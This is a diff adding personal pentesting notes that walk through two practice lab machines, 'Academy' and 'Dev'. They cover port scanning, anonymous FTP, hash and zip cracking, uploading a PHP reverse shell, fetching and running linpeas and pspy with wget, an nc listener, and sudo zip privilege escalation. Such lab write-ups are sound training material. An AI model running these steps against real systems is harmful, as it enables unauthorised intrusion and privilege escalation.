@@ -46,5 +46,103 @@ ETERNALBLUE github repo 3ndG4me/AutoBlue-MS17
 IMPORT the machine in the virutal box
 
 ----------------------------------------------------------------WALKTHROUGH - ACADEMY---------------------------------------------
+0S:Debian GNU/Linux 10 academy
+
+$ip a
+$nmap -A -p- -T4 192.168.138.129
+
+open ports: (21(ftp),22,80(apache 2.4.38))
+
+$ftp 192.168.138.129 (username:anonymous)
+$get note.txt
+ 
+Builtin tool:hash-identifier
+(hashcat-crack-md5-hashes)
+
+$locate rockyou.txt
+create the file with a hash
+$hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+$dirb http://192.168.138.129
+$ffuf -w /usr/share/wordlists/dirbuster/directory.txt:FUZZ -u http://192.168.138.129/
+
+1.found a login page , we got a credentials in note.txt through ftp ,and found profile image upload options
+the website written in php.
+2.get a reverse shell for php and upload the shell file.
+3.got reverse shell.
+4.using LinPeas - Linux Privilege Escalation Awesome Script checks path for PE.
+
+running local host web server
+python3 -m http.server 80
+
+IN ATTACKER MACHINE , reverse shell:
+$cd /tmp
+$pwd
+$wget http://192.168.138.131/linpeas.sh
+$ls
+$chmod +x linepeas.sh
+$./linpeas.sh
+
+found mysql password of grimmi user , used ssh to exploit
+$ssh grimmie@192.168.138.129
+
+$systemctl list-timers
+
+download pspy
+$wget http://192.168.138.131/pspy64
+$ls
+$chmod +x pspy64
+$./pspy64
+
+find a reverse shell for bash oneliner , 
+in sttacker machine: 
+$nc -nvlp 8081
+
+in target machine:
+execute the reverse shell ip.
+
+Now you become a root user.
+
+------------------------------------------------------WALKTHROUGH - DEV----------------------------------------------------------------
+
+Vuln machine ip : 192.168.138.137
+
+$nmap -A -T4 -p- 192.168.138.137
+
+open ports (22,80,111,2049,8080,42417,45263,59045,59831)
+
+80 - bolt-installation error page (linux machine)
+8080 - phpinfo page
+
+$ffuf -w wordlist:FUZZ -u http://192.168.138.137/FUZZ
+$ffuf -w wordlist:FUZZ -u http://192.168.138.137:8080/FUZZ
+
+$Sshowmount -e 192.168.138.137
+$mkdir /mnt/dev
+$mount -t nfs 192.168.138.137:/srv/nfs /mnt/dev
+$unzip save.zip
+
+$apt install fcrackzip
+$fcrackzip -v -u D -p wordlist save.zip (found password to open save.zip)
+
+#ssh -i id_rsa jp@192.168.138.137 (found this using save.zip)
+
+Boltwire website vulnerable to local file inclusion
+
+$ssh -i id_rsa jeanpaul@192.168.138.137 (password i_love_java)
+$history
+
+$sudo -l
+only /usr/bin/zip able to access
+
+gtfobins used to elevate the sudo users to root
+go to zip , copy and paste the command
+
+$id
+$cd /root
+$found the flag
+
+------------------------------------------------------------------------------
+
 
 
